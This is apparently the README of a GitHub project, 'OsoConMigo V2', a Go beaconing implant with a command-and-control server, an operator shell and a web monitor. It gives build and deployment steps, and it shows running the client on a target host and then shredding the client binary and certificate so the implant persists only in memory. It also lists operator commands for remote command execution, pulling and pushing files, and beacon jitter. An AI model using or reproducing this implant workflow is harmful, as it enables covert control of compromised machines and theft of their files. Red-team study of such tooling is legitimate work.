# OsoConMigo Version 2.1

[![Generic badge](https://img.shields.io/badge/Go-v1.14-blue.svg)](https://shields.io/) [![GitHub license](https://img.shields.io/github/license/Naereen/StrapDown.js.svg)](https://github.com/Naereen/StrapDown.js/blob/master/LICENSE)

OsoConMigo is in it's second version.  At the moment it is a simple beaconing implant written in Go.  Components of OsoConMigo are a client, Listening server and interactive shell.  The client communicates with the server over HTTP/2 at a specified comms interval.  A client can be tasked using the interactive shell to pull and push files, and execute commands on the target host.

## Getting Started

#### Install dependencies (Debian and Ubuntu)
```
Apt update && apt -y upgrade && apt -y install build-essential postgresql screen vim git upx
```

#### Install GO
```
wget https://dl.google.com/go/go1.14.1.linux-amd64.tar.gz
tar -C /usr/local -xzf go1.14.1.linuxamd64.gar.gz
rm -f go1.14.1.linux-amd64.tar.gz

echo "export PATH=$PATH:/usr/local/go/bin" >> ~/.profile
source ~/.profile
```

#### Get OsoConMigo
```
git clone https://github.com/mojo0243/OsoConMigoV2.git
```

#### Install Go Dependences
```
cd OsoConMigoV2
make deps
```

#### Setup Postres
```
# Start the postgres service
service postgresql start

# Change to the postgres user
su - postgres

# Create a new user
createuser --interactive --pwprompt
# Enter name of role to add: test
# Enter password for new role: pass
# Enter it again: pass
# Shall the new role be a super user? (y/n) y

# Create the database
psql
CREATE DATABASE oso;
\q

# Exit from the postgres user
exit
```

#### Building with the Makefile

Edit the Make file to include the IP for your server and any client specific information.  This can be overridden from the command line as an alternative.  Additional archectures can be added.  To view a list of architectures suppored natively by go, use the go tool command.

```
go tool dist list
```

#### Generic build instructions with make
```
cd OsoConMigoV2

# Build a server, client and shell
make all

# Build the server
make build_server

# Build the shell
make build_shell

# Build a client with default settings
make build_linux64

# Make a custom client with and over ride Node name
make build_mips NODE=M0001

# Make a custom client and over ride all options
make build_arm NODE=A0001 URL=https://localhost:8443/tienda/peluche SECRET=superChief COMMS=30 FLEX=10
```

#### Building a Certificate

When buildig the certificate ensure that the common name is 'localhost'.  Otherwise you may receive a TLS Handshake error on the server.  Currently the Netgear R6400 gives this same issue due to not using SSL and having no rootCA Pool.  I am currently working this issue.

```
cd server; mkdir cert
openssl genrsa -out cert/server.key 4096
openssl req -new -x509 -sha256 -days 365 -key cert/server.key -out cert/server.crt
```

#### Start the Server
```
cd server
./server -c config.yml

# Starting the Server in a screen session
screen -S Oso_Server
./server -c config.yml
 
# Background the screen session
 ctrl+a d

# To interact with the screen session
 screen -ls (to ensure it is still running)
 screen -x Oso_Server
```

#### Start the Shell
```
cd shell
./shell -c config.yml

# Starting the Server in a screen session
screen -S Oso_Shell
./shell -c config.yml
 
# Background the screen session 
 ctrl+a d

# To interact with the screen session 
 screen -ls (to ensure it is still running)
 screen -x Oso_Shell
```

#### Execute client on target host
```
# Start client
./client -c server.crt &

# To run in memory after starting
shred -fuz server.crt; rm -f client
```

#### Validate Postgres database
```
# Login to shell
sudo -u postgres psql

# Connect to oso database
\c oso

# View tables
\dt

# Drop old tables
DROP TABLE agents,results,tasks,tokens;
```

#### Basic usage
```
clients					: List available clients
client <node>				: Tag into client for interaction.  client without a name brings the user back to home and lists clients.
task <command>				: Task the client to execute a command. Must start with shell. Ex: /bin/bash, /bin/sh, cmd.exe
staged					: Show jobs in the queue not yet deployed for current client
deploy					: Move staged jobs into deployed queue.  Client can access jobs only once deployed.
revoke 					: Remove deployed jobs
revoke restage				: Removes deployed jobs and places them in the staged que to allow for additional commands to be added
flush 					: Flush commands in the staged queue
set comms <int>				: Task the client to modify it's comms interval in seconds.
set flex <int>				: task the client to offset the comms by (+/-) x seconds.
kill 					: Kill the client process
job <job id>				: Show the output from a job
jobs					: List complete and deployed jobs
pull <remote file>			: Pulle a file from the target machine.
push <local file> <remote file>		: Push a local file to the target machine.
forget <node>				: Remove a client from the database
dump					: When tagged into a client with dump jobID:Node:Task:Result into the server out file (result will be base64 encoded)
default					: Tag into the default command section
cook					: When tagged into default type cook followed by any other standard commands to set default commands for initial client check ins
trash					: Remove tasks from default that have not been served
serve					: Set default tasks to be picked up on any initial check in by a client
eat					: Remove served tasks from default
basket					: View any default tasks that have not been set to serve
served					: View default tasks which will be picked up by any client on initial check in
clear					: Clear all data from tasks, clients, results, defaults and tokens
quit					: Exit the shell
```

#### Convert results in dump file from base64 to human readable

The python script read_results.py takes two commands.  The -i and the -o commands. The -i is for the file you wish to read which as base64 from the dump command.  The -o is for where you want the results to be written to.

```
python3 read_results.py -i in.txt -o out.txt
```

#### Web Interface monitor

This python script provides a simple web interface that allows the user to have a quick refernce for available nodes, first seen and last seen, along with status of jobs deployed.  Because this is written in python flask it is only recommended to run on the local host ip and use ssh for remote port forward if placing on a different computer.  This application requires a login for access.  Currently the /create-user page is not set to force a login for view.  This can be fixed by uncommenting the for lines on the index/routes.py file under the /create-user route.  If these lines are uncommented the only username which can access this page afterwards is admin.

#### Setup the Web interface monitor

```
cd monitor
apt install python3
pip3 install -r requirements.txt
```

#### Start the Web interface monitor

The ocm_v2.py script takes a -i for IP address and -p for port

```
python3 ocm_v2.py -i 127.0.0.1 -p 8000
```

#### Create a new user

Open a browser and browse to http://127.0.0.1:8000/create-user

#### Log in and view Web interface monitor

Open a browser and browse to http://127.0.0.1:8000/login

#### TO DO

1. Add database column that indicates bool value for files.

2. Write files pulled to out folder instead of database.  based on bool value. Preserve pull path

3. Add a scheduler option to run recuring commands at a given interval

